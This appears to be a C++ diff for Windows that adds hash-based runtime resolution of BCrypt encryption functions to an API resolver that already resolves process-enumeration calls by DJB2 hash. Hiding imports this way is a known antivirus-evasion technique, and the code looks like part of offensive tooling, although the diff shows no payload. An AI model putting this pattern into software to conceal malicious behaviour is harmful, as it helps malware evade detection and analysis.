@@ -83,8 +83,16 @@ namespace hashes
     constexpr DWORD Process32First             = integral_constant<DWORD, HashStringDjb2A("Process32First")>::value;
     constexpr DWORD Process32Next              = integral_constant<DWORD, HashStringDjb2A("Process32Next")>::value;
 
+    /* BCRYPT */
 
-
+    constexpr DWORD BCryptOpenAlgorithmProvider     = integral_constant<DWORD, HashStringDjb2A("BCryptOpenAlgorithmProvider")>::value;
+    constexpr DWORD BCryptCloseAlgorithmProvider    = integral_constant<DWORD, HashStringDjb2A("BCryptCloseAlgorithmProvider")>::value;
+    constexpr DWORD BCryptGetProperty               = integral_constant<DWORD, HashStringDjb2A("BCryptGetProperty")>::value;
+    constexpr DWORD BCryptSetProperty               = integral_constant<DWORD, HashStringDjb2A("BCryptSetProperty")>::value;
+    constexpr DWORD BCryptGenerateSymmetricKey      = integral_constant<DWORD, HashStringDjb2A("BCryptGenerateSymmetricKey")>::value;
+    constexpr DWORD BCryptEncrypt                   = integral_constant<DWORD, HashStringDjb2A("BCryptEncrypt")>::value;
+    constexpr DWORD BCryptDecrypt                   = integral_constant<DWORD, HashStringDjb2A("BCryptDecrypt")>::value;
+    constexpr DWORD BCryptDestroyKey                = integral_constant<DWORD, HashStringDjb2A("BCryptDestroyKey")>::value;
 };
 
 // This function will resolve all of the functions in our API_FUNCTIONS struct
@@ -112,6 +120,20 @@ void APIResolver::ResolveAPI()
     api.func.pProcess32First             = reinterpret_cast<Process32First_t>            (GetProcessAddressByHash(this->api.mod.Kernel32, hashes::Process32First));
     api.func.pProcess32Next              = reinterpret_cast<Process32Next_t>             (GetProcessAddressByHash(this->api.mod.Kernel32, hashes::Process32Next));
 
+
+    // BCrypt
+
+    api.func.pBCryptOpenAlgorithmProvider  = reinterpret_cast<BCryptOpenAlgorithmProvider_t> (GetProcessAddressByHash(this->api.mod.BCrypt, hashes::BCryptOpenAlgorithmProvider));
+    api.func.pBCryptCloseAlgorithmProvider = reinterpret_cast<BCryptCloseAlgorithmProvider_t>(GetProcessAddressByHash(this->api.mod.BCrypt, hashes::BCryptCloseAlgorithmProvider));
+    api.func.pBCryptGetProperty            = reinterpret_cast<BCryptGetProperty_t>           (GetProcessAddressByHash(this->api.mod.BCrypt, hashes::BCryptGetProperty));
+    api.func.pBCryptSetProperty            = reinterpret_cast<BCryptSetProperty_t>           (GetProcessAddressByHash(this->api.mod.BCrypt, hashes::BCryptSetProperty));
+    api.func.pBCryptGenerateSymmetricKey   = reinterpret_cast<BCryptGenerateSymmetricKey_t>  (GetProcessAddressByHash(this->api.mod.BCrypt, hashes::BCryptGenerateSymmetricKey));
+    api.func.pBCryptEncrypt                = reinterpret_cast<BCryptEncrypt_t>               (GetProcessAddressByHash(this->api.mod.BCrypt, hashes::BCryptEncrypt));
+    api.func.pBCryptDecrypt                = reinterpret_cast<BCryptDecrypt_t>               (GetProcessAddressByHash(this->api.mod.BCrypt, hashes::BCryptDecrypt));
+    api.func.pBCryptDestroyKey             = reinterpret_cast<BCryptDestroyKey_t>            (GetProcessAddressByHash(this->api.mod.BCrypt, hashes::BCryptDestroyKey));
+    api.func.pBCryptCloseAlgorithmProvider = reinterpret_cast<BCryptCloseAlgorithmProvider_t>(GetProcessAddressByHash(this->api.mod.BCrypt, hashes::BCryptCloseAlgorithmProvider));
+
+
 }
 
 void *API::APIResolver::_(void** ppAddress)
@@ -133,11 +155,14 @@ void APIResolver::LoadModules()
 {
     this->api.mod.Kernel32 = GetModuleHandleA("kernel32.dll");
     this->api.mod.Ntdll    = GetModuleHandleA("ntdll.dll");
+    this->api.mod.BCrypt   = LoadLibraryA("BCrypt.dll");
     
 
     if (!this->api.mod.Kernel32)
         return;
     if (!this->api.mod.Ntdll)
+        return;
+    if (!this->api.mod.BCrypt)
         return;
 }
 
